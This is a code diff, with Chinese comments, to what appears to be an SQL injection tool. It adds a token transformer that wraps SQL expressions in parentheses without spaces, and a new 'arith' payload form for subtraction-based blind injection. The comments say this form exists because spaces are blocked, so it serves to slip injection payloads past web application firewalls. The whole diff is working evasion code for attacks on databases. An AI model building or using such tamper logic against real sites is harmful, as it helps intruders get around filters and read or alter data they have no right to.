@@ -111,6 +111,21 @@ def parenthesize(sql: str) -> str:
     return _transform_tokens(list(_iter_tokens(sql)))
 
 
+def _single_group(arg: list) -> bool:
+    """arg 是否为单个完整括号组 (...)（中间深度不归零）。"""
+    if not arg or arg[0] != ("sym", "(") or arg[-1] != ("sym", ")"):
+        return False
+    depth = 0
+    for kind, text in arg[:-1]:
+        if kind == "sym" and text == "(":
+            depth += 1
+        elif kind == "sym" and text == ")":
+            depth -= 1
+            if depth == 0:
+                return False
+    return True
+
+
 def _transform_tokens(toks) -> str:
     out, i, n = [], 0, len(toks)
 
@@ -171,13 +186,21 @@ def _transform_tokens(toks) -> str:
                 if cur or not cols:
                     cols.append(cur)
                 out.append("select" + ",".join(
-                    f"({_transform_tokens(c)})" for c in cols))
+                    _transform_tokens(c) if c and c[0] == ("sym", "(")
+                    else f"({_transform_tokens(c)})"
+                    for c in cols))
             elif kw == "union":
                 out.append("union(" + _transform_tokens(toks[i + 1:]) + ")")
                 i = n
             else:
                 arg, i2 = _collect_arg(i + 1)
-                out.append(kw + f"({_transform_tokens(arg)})" if arg else kw)
+                if not arg:
+                    out.append(kw)
+                elif arg[0] == ("sym", "("):
+                    # 已自带括号分组（如派生表 (select..)t）——再加层可能不合法
+                    out.append(kw + _transform_tokens(arg))
+                else:
+                    out.append(kw + f"({_transform_tokens(arg)})")
                 i = i2
         else:
             out.append(text)
@@ -197,7 +220,8 @@ TAMPERS = {
 
 def apply_form(core: str, form: str) -> str:
     """按实测命中的 payload 形态变换核心 SQL。"""
-    if form in ("paren", "xor"):
+    if form in ("paren", "xor", "arith"):
+        # arith（减法盲注）：空格必被拦，一切表达式强制括号化无空格
         return parenthesize(core)
     if form == "inline":
         return space2comment(core)
@@ -211,7 +235,7 @@ def apply_form(core: str, form: str) -> str:
 def form_sep(form: str) -> str:
     """数字型（无闭合引号）时 pre 与关键字核心之间的形态分隔符。"""
     return {"classic": " ", "inline": "/**/", "tab": "\t", "paren": "\t",
-            "orinject": " ", "xor": ""}.get(form, " ")
+            "orinject": " ", "xor": "", "arith": ""}.get(form, " ")
 
 
 # ---------------------------------------------------------------------------
